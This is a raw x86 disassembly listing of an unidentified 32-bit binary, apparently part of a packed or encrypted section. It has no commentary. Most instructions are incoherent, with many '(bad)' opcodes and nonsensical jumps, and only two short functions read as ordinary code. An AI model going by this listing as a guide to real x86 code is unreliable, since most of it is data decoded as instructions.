  4159b5:	sub    al,0x8f
  4159b7:	loop   0x41593d
  4159b9:	retf   0x9119
  4159bc:	test   bl,ah
  4159be:	fadd   st,st(0)
  4159c0:	lods   al,BYTE PTR ds:[esi]
  4159c1:	inc    ecx
  4159c2:	fadd   QWORD PTR [edx-0x30]
  4159c5:	nop
  4159c6:	mov    eax,ds:0xe38cf44a
  4159cb:	nop
  4159cc:	fidivr WORD PTR ds:0x53f7d41e
  4159d2:	out    dx,eax
  4159d3:	call   0xee1407e4
  4159d8:	push   ecx
  4159d9:	into   
  4159da:	cmp    al,0x5c
  4159dc:	repnz repnz inc edx
  4159df:	ret    
  4159e0:	shr    BYTE PTR [ecx+0x50ba57fd],cl
  4159e6:	arpl   WORD PTR [edx],di
  4159e8:	sbb    eax,0xc6cac714
  4159ed:	mul    bh
  4159ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159f0:	xchg   edi,eax
  4159f1:	jae    0x41598f
  4159f3:	adc    al,0x1b
  4159f5:	jmp    0x415a63
  4159f7:	jbe    0x415a0e
  4159f9:	xlat   BYTE PTR ds:[ebx]
  4159fa:	(bad)  
  4159fb:	out    0x4,al
  4159fd:	pushf  
  4159fe:	adc    DWORD PTR [eax],esp
  415a00:	and    eax,0x7221d6c6
  415a05:	sbb    ah,BYTE PTR [ebx-0x69]
  415a08:	(bad)  
  415a09:	mov    fs,ebx
  415a0b:	les    ebp,FWORD PTR [esp+eax*2-0x7d7b2229]
  415a12:	push   edi
  415a13:	xchg   esp,eax
  415a14:	cmp    DWORD PTR ds:0xdc7ae184,edi
  415a1a:	jl     0x415a47
  415a1c:	ins    DWORD PTR es:[edi],dx
  415a1d:	xchg   ecx,eax
  415a1e:	and    edx,DWORD PTR [edi+0x16fb12b]
  415a24:	inc    ecx
  415a25:	imul   BYTE PTR [eax+0x6e]
  415a28:	daa    
  415a29:	sub    eax,0xe906118c
  415a2e:	rol    DWORD PTR [ebx-0x40cbb8c],cl
  415a34:	or     al,0x9b
  415a36:	retw   
  415a38:	and    DWORD PTR [ebx+0x4f],esp
  415a3b:	je     0x415aa9
  415a3d:	push   eax
  415a3e:	jnp    0x415a3a
  415a40:	pop    es
  415a41:	dec    edx
  415a42:	jecxz  0x4159df
  415a44:	adc    BYTE PTR [ebx-0x6a],0xb4
  415a48:	aas    
  415a49:	cmp    DWORD PTR [esi],esi
  415a4b:	arpl   WORD PTR [eax+0x27],di
  415a4e:	adc    al,0xb4
  415a50:	lock add eax,0x629586c5
  415a56:	or     eax,0x95489fbd
  415a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5c:	mov    eax,ds:0xfc467fc6
  415a61:	lock xchg esp,eax
  415a63:	cmc    
  415a64:	aaa    
  415a65:	mov    ecx,DWORD PTR [esp+edx*2]
  415a68:	rol    BYTE PTR [ecx],1
  415a6a:	xchg   edx,eax
  415a6b:	cdq    
  415a6c:	aad    0x33
  415a6e:	sub    edx,ebx
  415a70:	jle    0x415a67
  415a72:	sub    ah,BYTE PTR [edi+0x264afe4c]
  415a78:	popa   
  415a79:	aas    
  415a7a:	mov    ds:0x3606583e,eax
  415a7f:	fcomp  DWORD PTR [edi]
  415a81:	cmp    DWORD PTR [ebx],esp
  415a83:	jmp    DWORD PTR [esi+0x2b]
  415a86:	out    dx,al
  415a87:	xchg   edx,eax
  415a88:	int    0x4f
  415a8a:	or     ch,BYTE PTR [esi-0x4a]
  415a8d:	das    
  415a8e:	add    BYTE PTR [edx+0x7abf6a39],dh
  415a94:	aam    0xbf
  415a96:	pushf  
  415a97:	push   eax
  415a98:	arpl   WORD PTR [edi-0x58b738e0],cx
  415a9e:	jmp    0x415ad6
  415aa0:	enter  0x8759,0x5
  415aa4:	xor    BYTE PTR [edx-0x7f],bh
  415aa7:	and    eax,0x90885896
  415aac:	mov    ds:0xa09cfe37,eax
  415ab1:	daa    
  415ab2:	xor    ebx,DWORD PTR [edx+0x8f69e4c]
  415ab8:	clc    
  415ab9:	repz sbb al,0xba
  415abc:	mov    WORD PTR [ebp+0x2a],?
  415abf:	imul   ebx,DWORD PTR ds:0x5adf8f92,0xffffffc8
  415ac6:	adc    esi,ecx
  415ac8:	mov    dl,0x75
  415aca:	mov    cl,0xda
  415acc:	jns    0x415aba
  415ace:	inc    ebp
  415acf:	lock xchg BYTE PTR [eax+0x3b4c15c7],cl
  415ad6:	pop    edx
  415ad7:	cmp    eax,0x385e3c9d
  415adc:	sbb    bh,BYTE PTR [eax-0x54c8f20f]
  415ae2:	shl    ch,0x41
  415ae5:	outs   dx,BYTE PTR ds:[esi]
  415ae6:	sub    dl,BYTE PTR [eax]
  415ae8:	je     0x415b47
  415aea:	test   DWORD PTR [ebp*2+0x711947c3],0x67a08996
  415af5:	int    0x75
  415af7:	pop    ebx
  415af8:	outs   dx,DWORD PTR ds:[esi]
  415af9:	scas   al,BYTE PTR es:[edi]
  415afa:	jae    0x415a7f
  415afc:	mov    dl,0xe1
  415afe:	dec    edi
  415aff:	mov    bl,0x19
  415b01:	sar    BYTE PTR [edi+0x685e7d8c],1
  415b07:	daa    
  415b08:	mov    ds:0x693e87ce,al
  415b0d:	enter  0xb281,0x36
  415b11:	jo     0x415aca
  415b13:	(bad)  
  415b14:	jne    0x415b5d
  415b16:	loope  0x415aab
  415b18:	cmp    dl,BYTE PTR [edi]
  415b1a:	pop    ebp
  415b1b:	and    DWORD PTR [eax+0x12],ebp
  415b1e:	retf   0xe382
  415b21:	sub    eax,0xc97f579b
  415b26:	or     edi,0x5
  415b29:	pop    esi
  415b2a:	(bad)  
  415b2d:	daa    
  415b2e:	std    
  415b2f:	or     dl,BYTE PTR [esi-0x5b]
  415b32:	dec    eax
  415b33:	mov    DWORD PTR [ecx],ebx
  415b35:	cmp    al,0xf2
  415b37:	cli    
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x98d018bc
  415bea:	aad    0x23
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0xc]
  415bf5:	aas    
  415bf6:	call   0x9a275e96
  415bfb:	adc    BYTE PTR [esi+0x7d],dl
  415bfe:	sub    eax,DWORD PTR [eax+0x57]
  415c01:	cmp    DWORD PTR [ebp+0x5a23308e],0x64
  415c08:	and    DWORD PTR [esi-0x2a149584],edi
  415c0e:	sbb    ch,bl
  415c10:	jns    0x415bda
  415c12:	xor    DWORD PTR [edx],esp
  415c14:	push   ecx
  415c15:	lahf   
  415c16:	cmp    ax,0x809a
  415c1a:	imul   esp,esp,0x6432da16
  415c20:	call   0x6c11:0x2f0ab46f
  415c27:	das    
  415c28:	dec    ecx
  415c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c2a:	sbb    BYTE PTR [edx-0x2b],ch
  415c2d:	dec    ebp
  415c2e:	lods   eax,DWORD PTR ds:[esi]
  415c2f:	loopne 0x415c52
  415c31:	adc    eax,0x8bb18528
  415c36:	inc    eax
  415c37:	stc    
  415c38:	xchg   edx,eax
  415c39:	inc    edx
  415c3a:	nop
  415c3b:	inc    edi
  415c3c:	ror    BYTE PTR [esp+ebp*4+0x4d935e0c],cl
  415c43:	cs in  al,dx
  415c45:	mov    dl,0x57
  415c47:	jl     0x415cc7
  415c49:	push   es
  415c4a:	cdq    
  415c4b:	ret    0x387
  415c4e:	lods   eax,DWORD PTR ds:[esi]
  415c4f:	ficomp DWORD PTR [ebx+eiz*2+0x41]
  415c53:	dec    ebx
  415c54:	sub    DWORD PTR [eax-0x50],ebx
  415c57:	adc    eax,0x71c9d0f2
  415c5c:	mov    edi,ebp
  415c5e:	cmp    ecx,DWORD PTR [ebx+0x1e5f3565]
  415c64:	sub    ch,BYTE PTR [ebx+0x1d733248]
  415c6a:	fwait
  415c6b:	push   ebp
  415c6c:	sbb    BYTE PTR [ebx],ah
  415c6e:	xor    ch,BYTE PTR [edi-0x61]
  415c71:	jecxz  0x415ca7
  415c73:	int3   
  415c74:	jp     0x415c53
  415c76:	mul    DWORD PTR ds:0xcfeacbc7
  415c7c:	aaa    
  415c7d:	sbb    al,0x5
  415c7f:	call   ebx
  415c81:	sbb    eax,0xe83019e
  415c86:	nop
  415c87:	xchg   ebp,eax
  415c88:	or     al,0xd
  415c8a:	out    0xe4,eax
  415c8c:	in     eax,0xc7
  415c8e:	js     0x415c5e
  415c90:	mov    bh,0xe5
  415c92:	out    0x66,eax
  415c94:	mov    esp,0xcdaccf28
  415c99:	pop    eax
  415c9a:	ficomp DWORD PTR [ebx+0x5d]
  415c9d:	scas   eax,DWORD PTR es:[edi]
  415c9e:	sub    al,0xf9
  415ca0:	xor    BYTE PTR [edx*8+0x214f8ef6],al
  415ca7:	arpl   WORD PTR [ebx-0x349b747f],bp
  415cad:	(bad)  
  415cae:	xchg   edi,eax
  415caf:	retf   
  415cb0:	rcr    BYTE PTR [eax+0x55],1
  415cb3:	jmp    0x4b25e99d
  415cb8:	ror    DWORD PTR [ebp-0x2a],0xc6
  415cbc:	push   ebx
  415cbd:	out    0xc4,al
  415cbf:	mov    es,edx
  415cc1:	push   ds
  415cc2:	fistp  DWORD PTR [edi]
  415cc4:	mov    ?,WORD PTR [ebx]
  415cc6:	retf   
  415cc7:	and    al,0x77
  415cc9:	dec    ebx
  415cca:	out    dx,al
  415ccb:	adc    eax,ebx
  415ccd:	dec    esp
  415cce:	xchg   edx,eax
  415ccf:	sub    eax,DWORD PTR [eax]
  415cd1:	bound  edx,QWORD PTR [ebp+0x6021361f]
  415cd7:	add    eax,0x93ad2e72
  415cdc:	sub    eax,0x73db8f75
  415ce1:	jg     0x415d4a
  415ce3:	pop    esi
  415ce4:	(bad)  
  415ce5:	mov    dl,0x18
  415ce7:	jae    0x415c9e
  415ce9:	push   eax
  415cea:	cs sub eax,0x59733c1c
  415cf0:	jmp    0xd2b4c21c
  415cf5:	mov    eax,0x31612683
  415cfa:	dec    DWORD PTR [edi+0x18eb5657]
  415d00:	sub    al,0x81
  415d02:	push   0xde449dc9
  415d07:	jns    0x415d57
  415d09:	mov    al,0x44
  415d0b:	or     dl,0xdb
  415d0e:	or     BYTE PTR [ebp+0x17],al
  415d11:	aas    
  415d12:	cmp    bl,dh
  415d14:	out    dx,eax
  415d15:	pop    edi
  415d16:	mov    edx,0x4cc074c5
  415d1b:	rcl    BYTE PTR [edi-0x7],0x61
  415d1f:	xlat   BYTE PTR ds:[ebx]
  415d20:	out    dx,al
  415d21:	dec    ebp
  415d22:	clc    
  415d23:	mov    ch,0xfb
  415d25:	loopne 0x415ce5
  415d27:	out    0x10,al
  415d29:	and    bl,BYTE PTR [edx]
  415d2b:	push   cs
  415d2c:	aaa    
  415d2d:	dec    esp
  415d2e:	cmp    bh,BYTE PTR [eax]
  415d30:	mov    al,0x8b
  415d32:	pop    esi
  415d33:	dec    ebx
  415d34:	fisubr DWORD PTR [eax-0x2d]
  415d37:	lock std 
  415d39:	xor    DWORD PTR [ebx],ecx
  415d3b:	dec    ebp
  415d3c:	dec    ecx
  415d3d:	pushaw 
  415d3f:	loop   0x415d9b
  415d41:	dec    edi
  415d42:	sbb    ecx,DWORD PTR [eax-0x6b]
  415d45:	sbb    al,0xe0
  415d47:	ret    
  415d48:	mov    ds:0x95a04416,eax
  415d4d:	xchg   esp,eax
  415d4e:	inc    ebp
  415d4f:	call   0xf5d809a9
  415d54:	sbb    ecx,DWORD PTR [ebx]
  415d56:	adc    bl,BYTE PTR [edi]
  415d58:	jmp    0x415d33
  415d5a:	mov    edx,0x3f974cb1
  415d60:	sbb    eax,0xe52c98c0
  415d65:	sub    ecx,DWORD PTR [esi+0x24]
  415d68:	and    DWORD PTR [eax+0x53],edx
  415d6b:	mov    ebp,DWORD PTR [ebx+0x29934804]
  415d71:	leave  
  415d72:	shl    eax,1
  415d74:	lds    esp,FWORD PTR [esi+0x585b8bd6]
  415d7a:	pop    ss
  415d7b:	ja     0x415d11
  415d7d:	adc    eax,0x60ef1b7a
  415d82:	jg     0x415d6e
  415d84:	sbb    DWORD PTR [ebx],ecx
  415d86:	leave  
  415d87:	pop    ss
  415d88:	enter  0x57dc,0x3d
  415d8c:	(bad)  
  415d8d:	adc    eax,0xfbca53c6
  415d92:	mov    BYTE PTR [ebx],0xd1
  415d95:	dec    BYTE PTR [edi-0x183e5aa1]
  415d9b:	ja     0x415dd2
  415d9d:	test   eax,0x1fbaf64c
  415da2:	setae  BYTE PTR [edi]
  415da5:	xor    al,0xd0
  415da7:	leave  
  415da8:	jo     0x415d8d
  415daa:	push   edx
  415dab:	fsub   QWORD PTR [edx]
  415dad:	lea    ecx,[ecx-0x37448801]
  415db3:	mov    al,0xa8
  415db5:	fnstenv [ebp+0x2ddfdd69]
  415dbb:	push   0x73b932b4
  415dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc1:	dec    dx
  415dc3:	sub    al,BYTE PTR [edx+0x7f]
  415dc6:	adc    ebx,0xffffffba
  415dc9:	add    eax,edi
  415dcb:	pop    es
  415dcc:	dec    esi
  415dcd:	test   al,0x3c
  415dcf:	arpl   WORD PTR [edx-0x48],bp
  415dd2:	push   esi
  415dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dd4:	retf   0xbdb6
  415dd7:	jmp    0xaff397ab
  415ddc:	inc    edx
  415ddd:	push   ecx
  415dde:	cld    
  415ddf:	cmp    BYTE PTR [ebp-0x2b],bh
  415de2:	rcl    DWORD PTR [ebx],cl
  415de4:	and    edx,DWORD PTR [edi-0x73]
  415de7:	test   eax,0x97ccef26
  415dec:	sub    bh,bh
  415dee:	retf   
  415def:	aaa    
  415df0:	fdivr  st(0),st
  415df2:	add    al,BYTE PTR [edi-0x1f]
  415df5:	jo     0x415d8a
  415df7:	or     al,0x1e
  415df9:	and    al,0x7f
  415dfb:	jle    0x415de3
  415dfd:	(bad)  
  415dfe:	je     0x415e37
  415e00:	sahf   
  415e01:	mov    ecx,0x2f9cd5ed
  415e06:	sbb    DWORD PTR es:[ecx+ebx*8+0x25],esi
  415e0b:	dec    ecx
  415e0c:	(bad)  
  415e0e:	sub    eax,0x1ee8f859
  415e13:	loopne 0x415dc3
  415e15:	dec    esp
  415e16:	pop    es
  415e17:	add    DWORD PTR [edi-0x216e46a0],ebp
  415e1d:	mov    ebp,0xe58c4025
  415e22:	nop/reserved BYTE PTR cs:[edx]
  415e26:	test   BYTE PTR [esi],0xd
  415e29:	fadd   st(0),st
  415e2b:	add    eax,0xa7735187
  415e30:	nop
  415e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e32:	shl    DWORD PTR [ebx],1
  415e34:	outs   dx,BYTE PTR ds:[esi]
  415e35:	pop    edx
  415e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e37:	out    0xc8,eax
  415e39:	pop    ss
  415e3a:	cld    
  415e3b:	add    DWORD PTR [eax],edx
  415e3d:	pop    es
  415e3e:	stos   DWORD PTR es:[edi],eax
  415e3f:	jno    0x415de5
  415e41:	das    
  415e42:	test   DWORD PTR [esi-0x328342d],eax
  415e48:	sub    DWORD PTR [ebx],0x52c6247d
  415e4e:	xlat   BYTE PTR ds:[ebx]
  415e4f:	fsub   QWORD PTR [edi-0x4518652c]
  415e55:	xchg   esi,eax
  415e56:	mov    DWORD PTR [ebx+0x41],ecx
  415e59:	imul   ecx,DWORD PTR [ebp-0x520fea10],0x64c66cb4
  415e63:	jae    0x415e35
  415e65:	aam    0x0
  415e67:	loope  0x415e2e
  415e69:	xchg   ecx,eax
  415e6a:	out    dx,eax
  415e6b:	ds push ss
  415e6d:	jbe    0x415e0f
  415e6f:	and    DWORD PTR [esi+0x12c92705],ecx
  415e75:	loopne 0x415ec7
  415e77:	fucomip st,st(3)
  415e79:	popa   
  415e7a:	jge    0x415e43
  415e7c:	fs push esp
  415e7e:	jb     0x415ea1
  415e80:	push   ds
  415e81:	sahf   
  415e82:	push   0x3b83f1f
  415e87:	fwait
  415e88:	adc    eax,0xdd1060cc
  415e8d:	mov    edi,0xd83e870d
  415e92:	adc    edx,DWORD PTR [edi-0x422cb0a3]
  415e98:	mov    ?,WORD PTR ss:[eax-0x4e]
  415e9c:	sub    eax,0xe6fc4d6b
  415ea1:	mul    BYTE PTR [edi-0x66aee25a]
  415ea7:	mov    esi,0x1a1266d2
  415eac:	cdq    
  415ead:	mov    edi,0x8575065e
  415eb2:	loope  0x415e4d
  415eb4:	aam    0xe3
  415eb6:	out    0xfc,eax
  415eb8:	sub    eax,0xd70c49dd
  415ebd:	(bad)  
  415ebe:	in     eax,0x59
  415ec0:	mov    ch,0xf5
  415ec2:	inc    esp
  415ec3:	xchg   ecx,eax
  415ec4:	aam    0x54
  415ec6:	lock mov ecx,0xda9a9bb7
  415ecc:	jns    0x415e69
  415ece:	ins    BYTE PTR es:[edi],dx
  415ecf:	adc    ecx,esp
  415ed1:	xchg   edx,eax
  415ed2:	out    0x4a,al
  415ed4:	int3   
  415ed5:	(bad)  
  415ed6:	or     dh,BYTE PTR [esi]
  415ed8:	in     al,0x2f
  415eda:	dec    edx
  415edb:	pop    edx
  415edc:	mov    esi,0xc303e87
  415ee1:	loopne 0x415ed5
  415ee3:	jle    0x415ee7
  415ee5:	ror    BYTE PTR ds:0x63bc0ad,0x86
  415eec:	in     eax,dx
  415eed:	retf   
  415eee:	fldl2e 
  415ef0:	loope  0x415ed7
  415ef2:	mov    WORD PTR [edx],fs
  415ef4:	ins    DWORD PTR es:[edi],dx
  415ef5:	daa    
  415ef6:	push   ebx
  415ef7:	mov    ebx,ecx
  415ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415efa:	inc    ecx
  415efb:	ins    DWORD PTR es:[edi],dx
  415efc:	xchg   esp,eax
  415efd:	add    esp,0x5e5735b6
  415f03:	mov    bh,0x29
  415f05:	xchg   ebx,eax
  415f06:	fisttp DWORD PTR [edi-0x25]
  415f09:	xchg   ebp,eax
  415f0a:	jno    0x415f3f
  415f0c:	mov    dl,0x79
  415f0e:	test   cl,al
  415f10:	inc    BYTE PTR ss:0x634e4708
  415f17:	(bad)
  415f1a:	retf   0xebe8
  415f1d:	or     esi,DWORD PTR [ebx-0x4e]
  415f20:	jmp    0x415f75
  415f22:	pop    ds
  415f23:	cmp    bl,BYTE PTR [edx-0x21528a40]
  415f29:	(bad)  
  415f2b:	pop    esi
  415f2c:	push   cs
  415f2d:	cmp    eax,0xc8e404f6
  415f32:	fistp  DWORD PTR [eax]
  415f34:	jmp    0xe3a5cadd
  415f39:	inc    DWORD PTR [eax]
  415f3b:	fnstenv [edi-0x11]
  415f3e:	xor    eax,0x95e95846
  415f43:	test   al,0xc
  415f45:	xor    cl,bl
  415f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f48:	mul    DWORD PTR [edi]
  415f4a:	fwait
  415f4b:	jecxz  0x415f11
  415f4d:	or     al,BYTE PTR [eax-0x8]
  415f50:	in     al,dx
  415f51:	(bad)  
  415f52:	fst    st(4)
  415f54:	sub    bh,ch
  415f56:	adc    BYTE PTR [ebx-0x43d0217b],dh
  415f5c:	test   dl,cl
  415f5e:	or     al,0x98
  415f60:	rol    DWORD PTR [eax+0x6f1b6005],cl
  415f66:	in     eax,dx
  415f67:	push   ecx
  415f68:	mov    esp,0x8cd89503
  415f6d:	(bad)  [ebx-0x2a]
  415f70:	(bad)  
  415f72:	push   ebx
  415f73:	push   ebp
  415f74:	enter  0xe0cd,0x74
  415f78:	ficom  DWORD PTR ss:[ecx]
  415f7b:	shrd   DWORD PTR [edx-0x10c2706a],edi,cl
  415f82:	mov    dh,0x78
  415f84:	mov    ds:0x5408821d,eax
  415f89:	pop    ebp
  415f8a:	xchg   esp,eax
  415f8b:	ficomp DWORD PTR [ecx-0x15]
  415f8e:	inc    edi
  415f8f:	leave  
  415f90:	mov    bl,0x4d
  415f92:	loop   0x415fe7
  415f94:	ror    DWORD PTR [ecx+0x38c3ac93],0x2d
  415f9b:	and    bh,BYTE PTR [ecx+esi*4+0x47]
  415f9f:	test   BYTE PTR [esi],bh
  415fa1:	scas   al,BYTE PTR es:[edi]
  415fa2:	jle    0x415fcf
  415fa4:	inc    edi
  415fa5:	(bad)  
  415fa6:	aad    0xf3
  415fa8:	loop   0x415fac
  415faa:	pop    esi
  415fab:	mov    dh,0xce
  415fad:	xchg   ebp,eax
  415fae:	push   0x4487100
  415fb3:	dec    ebp
  415fb4:	aad    0x73
  415fb6:	push   es
  415fb7:	push   ebx
  415fb8:	test   al,0xe7
  415fba:	add    BYTE PTR [ebx-0x44528c64],al
  415fc0:	push   ebx
  415fc1:	(bad)  
  415fc2:	scas   al,BYTE PTR es:[edi]
  415fc3:	scas   al,BYTE PTR es:[edi]
  415fc4:	cmp    DWORD PTR [eax],0xfffffffb
  415fc7:	mov    edx,0x5d738610
  415fcc:	inc    esi
  415fcd:	nop
  415fce:	fstp   TBYTE PTR [esi-0x1ddf367a]
  415fd4:	dec    ecx
  415fd5:	in     eax,dx
  415fd6:	sbb    eax,0x2637718a
  415fdb:	and    DWORD PTR [ecx],ebx
  415fdd:	sti    
  415fde:	sbb    al,0x6c
  415fe0:	sub    eax,eax
  415fe2:	(bad)  
  415fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe4:	or     al,0xf1
  415fe6:	stos   DWORD PTR es:[edi],eax
  415fe7:	imul   ebx,DWORD PTR [edi-0x51],0x22
  415feb:	rcr    BYTE PTR [edx-0x1ded9a6c],cl
  415ff1:	mov    al,0xb3
  415ff3:	add    esi,ecx
  415ff5:	mov    ebx,0x4a4e40d6
  415ffa:	cmc    
  415ffb:	inc    ecx
  415ffc:	xchg   edx,eax
  415ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ffe:	rcl    DWORD PTR [ebx],cl
  416000:	push   ecx
  416001:	jbe    0x41606f
  416003:	jp     0x415f94
  416005:	sbb    al,0xde
  416007:	gs iret 
  416009:	dec    edx
  41600a:	cmp    cl,BYTE PTR [edi-0x18]
  41600d:	jb     0x415fc0
  41600f:	or     cl,BYTE PTR [ecx+0x6cde2892]
  416015:	dec    esi
  416016:	push   0x5a
  416018:	loopne 0x41600c
  41601a:	rcr    BYTE PTR [edx],1
  41601c:	xor    BYTE PTR [ebx-0x74],al
  41601f:	stos   BYTE PTR es:[edi],al
  416020:	stos   DWORD PTR es:[edi],eax
  416021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416022:	sub    ebx,DWORD PTR [ebp+eax*4-0x56]
  416026:	mov    bh,0xa3
  416028:	fmulp  st(7),st
  41602a:	aaa    
  41602b:	lahf   
  41602c:	cli    
  41602d:	push   es
  41602e:	push   0x22
  416030:	stos   BYTE PTR es:[edi],al
  416031:	adc    ch,dl
  416033:	pinsrw mm4,WORD PTR [eax],0x5
  416037:	or     di,WORD PTR [edx+0x77]
  41603b:	leave  
  41603c:	in     eax,0x73
  41603e:	pop    ebx
  41603f:	in     eax,0xe5
  416041:	fwait
  416042:	sar    cl,0xba
  416045:	inc    eax
  416046:	dec    eax
  416047:	test   al,0x12
  416049:	pop    edi
  41604a:	pop    edi
  41604b:	mov    dh,0xd6
  41604d:	nop
  41604e:	out    dx,al
  41604f:	pop    ds
  416050:	sbb    cl,al
  416052:	dec    edi
  416053:	loop   0x416080
  416055:	and    al,0xb3
  416057:	and    eax,0x213bb26c
  41605c:	ret    
  41605d:	sub    al,0x98
  41605f:	push   ebp
  416060:	jne    0x41602c
  416062:	enter  0x2c35,0x71
  416066:	jg     0x416031
  416068:	push   ds
  416069:	int3   
  41606a:	mov    al,ds:0xad3edfc7
  41606f:	nop
  416070:	pop    ebx
  416071:	or     DWORD PTR [edi-0x5f0f8a64],ebp
  416077:	sub    edi,edx
  416079:	and    ebx,edx
  41607b:	dec    edi
  41607c:	sbb    DWORD PTR [esi-0x49],0xc82a029d
  416083:	into   
  416084:	scas   eax,DWORD PTR es:[edi]
  416085:	clc    
  416086:	stos   BYTE PTR es:[edi],al
  416087:	popf   
  416088:	xchg   ecx,eax
  416089:	xor    eax,0x6d45578f
  41608e:	mov    al,ds:0x1c873cc1
  416093:	push   ss
  416094:	and    al,0x90
  416096:	sbb    al,0x25
  416098:	call   0xeff88a71
  41609d:	or     bh,BYTE PTR [ecx+0xc]
  4160a0:	cdq    
  4160a1:	sub    bl,al
  4160a3:	and    ecx,edi
  4160a5:	les    esp,FWORD PTR [esi]
  4160a7:	(bad)  
  4160a8:	ficomp WORD PTR [ecx+ebx*1+0x7d]
  4160ac:	adc    BYTE PTR [ecx-0x2cdb1014],bh
  4160b2:	sar    BYTE PTR [edx+0x53f960ff],0x48
  4160b9:	pop    esp
  4160ba:	or     DWORD PTR [ebx+0x660e9073],edx
  4160c0:	inc    edx
  4160c1:	xchg   ebp,eax
  4160c2:	call   FWORD PTR [ecx]
  4160c4:	sbb    DWORD PTR [eax-0x5eb8520f],0xffffff86
  4160cb:	xchg   BYTE PTR [eax+edx*8+0x5],al
  4160cf:	xchg   edi,eax
  4160d0:	lods   eax,DWORD PTR ds:[esi]
  4160d1:	enter  0xd26e,0x3e
  4160d5:	jns    0x416139
  4160d7:	lock push es
  4160d9:	dec    ecx
  4160da:	or     bh,BYTE PTR [ecx-0x5b]
  4160dd:	mov    ebp,0xc13f3d4e
  4160e2:	dec    edi
  4160e3:	inc    ecx
  4160e4:	ins    BYTE PTR es:[edi],dx
  4160e5:	inc    eax
  4160e6:	pop    ebx
  4160e7:	imul   edi,DWORD PTR [ebp+0x5fcf9a30],0xf
  4160ee:	mov    cs,WORD PTR [eax-0x24107dbe]
  4160f4:	lods   eax,DWORD PTR ds:[esi]
  4160f5:	sub    BYTE PTR [eax+0x4e3c3f38],ah
  4160fb:	dec    edi
  4160fc:	fcomp  QWORD PTR [esi+ebx*8]
  4160ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416100:	inc    edx
  416101:	adc    esp,ebp
  416103:	inc    ebp
  416104:	cmp    esi,DWORD PTR ds:0xa644665e
  41610a:	xor    DWORD PTR [edi-0x195b23fd],0xf6607035
  416114:	pop    ds
  416115:	mov    esp,0xbb490ab9
  41611a:	xor    eax,0x966427d0
  41611f:	sbb    DWORD PTR [ebx+0x12ee845e],edx
  416125:	jnp    0x4160c0
  416127:	jnp    0x416196
  416129:	retf   
  41612a:	sub    ch,dl
  41612c:	sub    edi,DWORD PTR [edx+0x14]
  41612f:	stc    
  416130:	xlat   BYTE PTR cs:[ebx]
  416132:	daa    
  416133:	xchg   ebp,eax
  416134:	mov    ds:0xffae5123,eax
  416139:	xor    esi,edx
  41613b:	iret   
  41613c:	(bad)  
  41613d:	in     eax,dx
  41613e:	and    BYTE PTR [eax-0x38699049],dh
  416144:	fwait
  416145:	push   0xfffffffb
  416147:	mov    DWORD PTR [edx+edi*4-0x61],ebp
  41614b:	push   cs
  41614c:	adc    BYTE PTR [edi-0x57],cl
  41614f:	and    ecx,DWORD PTR [edx+0x15]
  416152:	into   
  416153:	scas   al,BYTE PTR es:[edi]
  416154:	dec    ebp
  416155:	xor    ah,0x7e
  416158:	push   ss
  416159:	sti    
  41615a:	or     esp,DWORD PTR [ebx-0x6c]
  41615d:	sub    al,0x4e
  41615f:	push   0x146ab0fa
  416164:	pop    es
  416165:	and    DWORD PTR [esi+eax*1],0xffffff9b
  416169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41616a:	mov    ebx,0xff3948b2
  41616f:	mov    al,0x43
  416171:	lea    ecx,[ebx-0x661cdba7]
  416177:	jl     0x416174
  416179:	(bad)  
  41617a:	add    al,0x42
  41617c:	xor    esp,DWORD PTR [edi+ebx*1+0x66]
  416180:	sub    al,0x16
  416182:	das    
  416183:	retf   0x566a
  416186:	add    DWORD PTR [esi-0x79],edi
  416189:	adc    al,0xb9
  41618b:	xchg   ecx,eax
  41618c:	push   ebp
  41618d:	xlat   BYTE PTR ds:[ebx]
  41618e:	inc    ebx
